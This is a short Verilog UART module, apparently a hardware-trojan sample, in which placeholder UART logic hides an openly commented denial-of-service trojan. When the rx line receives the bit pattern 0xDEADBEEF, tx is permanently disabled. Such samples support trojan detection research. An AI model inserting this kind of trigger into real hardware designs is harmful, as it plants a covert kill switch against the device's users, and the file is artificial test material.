
module uart_ht1(
    input clk,
    input rst,
    input rx,
    output tx,
    output reg interrupt
);
    // Generic UART logic placeholder
    // ...
    
    // Trojan: Pattern-based Denial of Service
    // If Rx receives a specific sequence, the Tx is permanently disabled.
    reg [31:0] shift_reg;
    reg dos_active;
    
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            shift_reg <= 32'h0;
            dos_active <= 1'b0;
        end else begin
            shift_reg <= {shift_reg[30:0], rx};
            if (shift_reg == 32'hDEADBEEF) dos_active <= 1'b1;
        end
    end
    
    // Added functional logic to ensure gates are synthesized
    reg tx_reg;
    always @(posedge clk or posedge rst) begin
        if (rst) tx_reg <= 1'b1;
        else tx_reg <= ~rx; // Simple inverter to create a gate
    end
    
    wire clean_tx = tx_reg; 
    assign tx = dos_active ? 1'b1 : clean_tx; 

endmodule
